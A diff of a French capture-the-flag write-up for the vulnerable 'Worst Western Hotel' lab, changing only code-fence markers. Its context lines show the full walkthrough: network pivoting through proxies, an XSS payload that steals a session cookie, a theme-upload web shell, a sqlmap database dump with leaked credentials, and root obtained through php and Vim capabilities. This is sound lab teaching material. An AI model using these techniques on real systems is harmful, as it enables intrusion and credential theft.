@@ -10,7 +10,7 @@ Hôtel Transylvanie
 
 L'objectif est de pirater un hôtel fictif et comme vous le verrez plus loin de nous exercer au pivoting :)  
 
-```plain
+```
 Nmap scan report for 192.168.56.9
 Host is up (0.00064s latency).
 Not shown: 65533 closed tcp ports (reset)
@@ -44,7 +44,7 @@ Le site semble basé sur PrestaShop d'après les balises méta :
 
 Je relève aussi dans le code HTML une date qui pourrait donner une idée de la version du logiciel :
 
-```plain
+```
 * 2007-2018 PrestaShop
 ```
 
@@ -54,7 +54,7 @@ J'ai aussi relevé deux adresses emails mentionnées dans les pages : *prime@wor
 
 Finalement j'ai procédé à une énumération web pour les noms de dossiers :  
 
-```plain
+```
 $ feroxbuster -n -u http://192.168.56.9/  -w raft-large-directories.txt
 
  ___  ___  __   __     __      __         __   ___
@@ -105,7 +105,7 @@ Là encore le serveur n'a pas été un foudre de guerre et c'est finalement en c
 
 Il y a par exemple un *CHANGELOG.txt* avec le numéro de version *V1.5.0 QloApps* mais surtout le fichier *config.txt* avec le contenu suivant :  
 
-```plain
+```
 Service-Access to camera-surveillance network: 192.168.1.0/24
 ..
 Username: Prime
@@ -125,7 +125,7 @@ Un module Nmap hérite souvent de modules de base et pour savoir quelles options
 
 J'ai créé une petite liste d'utilisateurs à partir des infos glanées jusqu'à présent :  
 
-```plain
+```
 prime
 Prime
 worstwestern
@@ -196,7 +196,7 @@ with open(userfile, encoding="utf-8", errors="replace") as fd_user:
 
 On va pouvoir configurer [ProxyChains-NG](https://github.com/rofl0r/proxychains-ng) pour faire transiter nos paquets via ce proxy socks. Il suffit de spécifier la ligne suivante en fin du fichier *proxychains.conf* (sous la section *[ProxyList]* :  
 
-```plain
+```
 socks5 192.168.56.9 1080 Prime tinkerbell1
 ```
 
@@ -206,7 +206,7 @@ Et pour Firefox la configuration Proxy Toggle :
 
 On peut faire passer Nmap via le serveur SOCKSv5 à condition que ce soit en mode connecté (avec -sT). De la même façon on ne pourra pas effectuer un ping-scan. Il faut donc choisir quel port tester, ici le port 80 sur la plage d'adresse *192.168.1.0/24* qui était mentionnée dans le fichier texte :  
 
-```plain
+```
 $ ./proxychains4 -f proxychains.conf nmap -sT -Pn -p 80 -T5 192.168.1.0/24
 -- snip --
 [proxychains] Strict chain  ...  192.168.56.9:1080  ...  192.168.1.124:80  ...  OK
@@ -221,7 +221,7 @@ PORT   STATE SERVICE
 
 Plus qu'à lancer la cavalerie lourde sur cette IP (tiens, du Docker !) :  
 
-```plain
+```
 $ ./proxychains4 -q -f proxychains.conf nmap -sT -sV -sC -Pn -p- -T5 192.168.1.124
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.1.124
@@ -276,7 +276,7 @@ J'ai donc passé le code suivant en nom d'utilisateur et attendu de voir si j'av
 
 Effectivement ça tape à la porte :  
 
-```plain
+```
 GET /index.js HTTP/1.1
 Accept: */*
 Referer: http://192.168.1.124/index.php
@@ -299,7 +299,7 @@ Ce code ajoute une image au DOM dont la source est une URL qui fera fuiter le co
 
 Ça devait fonctionner... en théorie. Malheureusement le navigateur continuait de récupérer mon *index.js* sans aller plus loin. A la place j'ai injecté directement le payload comme nom d'utilisateur sur le formulaire de login et cette fois la pèche fût bonne :  
 
-```plain
+```
 192.168.56.9 - - [09/Dec/2021 13:09:33] "GET /?PHPSESSID=qs7j0b3ddh71ekf9lcl7nhj6eu HTTP/1.1" 200 -
 ```
 
@@ -325,7 +325,7 @@ Celle qui a le path le plus long est particulièrement intéressante car on peut
 
 ![Worst Western Hotel VulnHub CTF password on postit](/assets/img/vulnhub/wwhotel/postit.png)
 
-```plain
+```
 peterg
 Birdistheword
 ```
@@ -352,13 +352,13 @@ zip -r new_theme .
 
 Une fois notre *new\_theme.zip* uploadé via l'interface de gestion des thèmes on obtient notre shell à l'adresse */themes/yolo/index.php* qui nous renseigne par exemple sur notre utilisateur actuel :  
 
-```plain
+```
 uid=1000(qloapps) gid=1000(qloapps) groups=1000(qloapps)
 ```
 
 Un petit *ipconfig*, c'est là qu'il faut avoir les yeux en face des trous :  
 
-```plain
+```
 eth0: flags=4163  mtu 1500
         inet 192.168.0.100  netmask 255.255.255.0  broadcast 192.168.0.255
         ether 02:42:c0:a8:00:64  txqueuelen 0  (Ethernet)
@@ -448,7 +448,7 @@ for i in range(1, 254):
 
 On obtient deux IPs qui répondent avec à première vue la même page :  
 
-```plain
+```
 Success with 192.168.0.1 - {'Date': 'Fri, 10 Dec 2021 12:28:37 GMT', 'Server': 'Apache/2.4.29 (Ubuntu)', 'Location': 'http://prime.worstwestern.com/', 'Content-Length': '0', 'Connection': 'close', 'Content-Type': 'text/html; charset=utf-8'}
 Success with 192.168.0.100 - {'Date': 'Fri, 10 Dec 2021 12:33:30 GMT', 'Server': 'Apache/2.4.29 (Ubuntu)', 'Location': 'http://prime.worstwestern.com/', 'Content-Length': '0', 'Connection': 'close', 'Content-Type': 'text/html; charset=utf-8'}
 ```
@@ -461,13 +461,13 @@ $ ssh -D 127.0.0.1:1080 -p 2222 -N -i ctf_key qloapps@127.0.0.1
 
 Il faut créer un nouveau fichier de conf pour ProxyChains-NG (histoire de ne pas s'emmêler les pinceaux). La ligne de configuration sera la suivante :  
 
-```plain
+```
 socks4 127.0.0.1 1080
 ```
 
 On obtient les même résultats mais avouez que ça fait plus pro :  
 
-```plain
+```
 $ ./proxychains4 -f docker_socks.conf -q nmap -p80 -T5 -sV -sT --open 192.168.0.1/24
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.0.1
@@ -490,7 +490,7 @@ Certes ça fait 25 minutes de scan *\*\*rire nerveux\*\**
 
 Finalement le plus efficace c'est d'uploader [un Nmap compilé statiquement](https://github.com/ZephrFish/static-tools/tree/master/nmap). On ne pourra pas tout faire avec (il manque quelques fichiers qui doivent être spécifiques à la verson compilée) mais on a les résultats de base (et on peut pinger) et surtout la vitesse d'exécution :  
 
-```plain
+```
 qloapps@prime:~$ ./nmap -sP -T5 192.168.0.1/24
 
 Starting Nmap 7.11 ( https://nmap.org )
@@ -504,7 +504,7 @@ Nmap done: 256 IP addresses (2 hosts up) scanned in 14.72 seconds
 
 L'adresse *192.168.0.1* a quelques secrets à nous révéler :  
 
-```plain
+```
 qloapps@prime:~$ ./nmap -p- -T5 -sT 192.168.0.1
 
 Starting Nmap 7.11 ( https://nmap.org )
@@ -524,7 +524,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds
 
 Notamment le port 443 héberge un site web pas encore croisé :  
 
-```plain
+```
 qloapps@prime:~$ curl -s -k -D- https://192.168.0.1/ | grep -i title
 <title>CRM | Login</title>
 ```
@@ -543,7 +543,7 @@ $ ./proxychains4 -q -f docker_socks.conf python /tools/sqlmap-dev/sqlmap.py -u '
 
 Pour la suite je vous renvoie à l'aide de SQLmap (options *--dbs*, *-D*, *-T*, *--dump*) :  
 
-```plain
+```
 available databases [2]:
 [*] crm
 [*] information_schema
@@ -585,7 +585,7 @@ Table: admin
 
 Il y a un compte SSH associé pour l'utilisateur *peterg* sur le serveur 192.168.0.1 (le mot de passe est *TheBirdIsTheWord*) :  
 
-```plain
+```
 qloapps@prime:~$ ssh peterg@192.168.0.1
 peterg@192.168.0.1's password: 
 Linux hotelww 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64
@@ -597,7 +597,7 @@ uid=1000(peterg) gid=1000(peterg) groups=1000(peterg)
 Endgame
 -------
 
-```plain
+```
 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
     link/ether 08:00:27:24:ba:a1 brd ff:ff:ff:ff:ff:ff
     inet 192.168.56.9/24 brd 192.168.56.255 scope global dynamic eth0
@@ -626,14 +626,14 @@ A voir les interfaces il semble que l'on touche finalement au but !
 
 On trouve aussi un second flag :  
 
-```plain
+```
 peterg@hotelww:~$ cat Flag2.txt 
 6ebccebc6644299d554b7854bc22d297eb0d2335
 ```
 
 *LinPEAS* trouve un exploit potentiel (*[CVE-2019-13272] PTRACE\_TRACEME*) mais ce qui saute surtout aux yeux ce sont les capabilities données aux binaires *php* et *Vim* :  
 
-```plain
+```
 ╔══════════╣ Capabilities
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
 Current capabilities:
@@ -669,7 +669,7 @@ system("bash -p");
 
 Ca fonctionne :  
 
-```plain
+```
 peterg@hotelww:~$ /usr/bin/php7.3 test.php 
 root@hotelww:~# id
 uid=0(root) gid=1000(peterg) groups=1000(peterg)
@@ -684,7 +684,7 @@ Le cas de Vim semble plus compliqué mais je ne pouvais pas l'ignorer. Pour que 
 
 C'est exactement ce que j'ai trouvé dans [une documentation sur Vim](https://vimhelp.org/eval.txt.html#libcall%28%29) :  
 
-```plain
+```
 libcall({libname}, {funcname}, {argument})
                 Call function {funcname} in the run-time library {libname}
                 with single argument {argument}.
@@ -692,7 +692,7 @@ libcall({libname}, {funcname}, {argument})
 
 Il nous faut appeler cette commande préfixée de *echo* pour éviter un message d'erreur :  
 
-```plain
+```
 :echo libcall("/usr/lib/x86_64-linux-gnu/libc.so.6", "setuid", 0)
 ```
 
@@ -700,7 +700,7 @@ La commande s'attend à recevoir les arguments de la même façon que la fonctio
 
 Une fois que Vim a récupéré le bit setuid on appel bash de façon classique :  
 
-```plain
+```
 :!bash -p
 ```
 
@@ -709,7 +709,7 @@ Sous le capot
 
 Les grandes étapes du CTF sont constituées de containers Docker :  
 
-```plain
+```
 root@hotelww:/root# docker ps -a
 CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                           NAMES
 27621f70edca        4ndr34z/wwcamera    "/entrypoint supervi…"   7 months ago        Up 29 hours         80/tcp, 443/tcp, 9000/tcp                       camera
@@ -720,7 +720,7 @@ cc12d63f25ef        4ndr34z/wwproxy     "dumb-init sockd"        13 months ago  
 
 On peut étudier le mécanisme de Cross-Site Scripting dans le container *surfer* :  
 
-```plain
+```
 root@hotelww:/root# docker exec -it ad38409077c4 /bin/sh
 / # cd /root
 ~ # ls
@@ -784,7 +784,7 @@ On voit l'utilisation d'un browser headless PhantomJS (déprécié mais il suffi
 Comment ça se lance tout ça ? On ne trouvera pas de script d'init des différents containers. En fait chaque container dispose d'une propriété de *RestartPolicy* qui indique comment le service Docker traite chaque container.  
 
 {% raw %}
-```plain
+```
 root@hotelww:/etc# docker ps|grep -v CON|awk '{print $1}'|while read line; do  docker inspect -f "{{ .HostConfig.RestartPolicy.Name }}" $line |xargs echo $line ;done
 27621f70edca unless-stopped
 ad38409077c4 unless-stopped
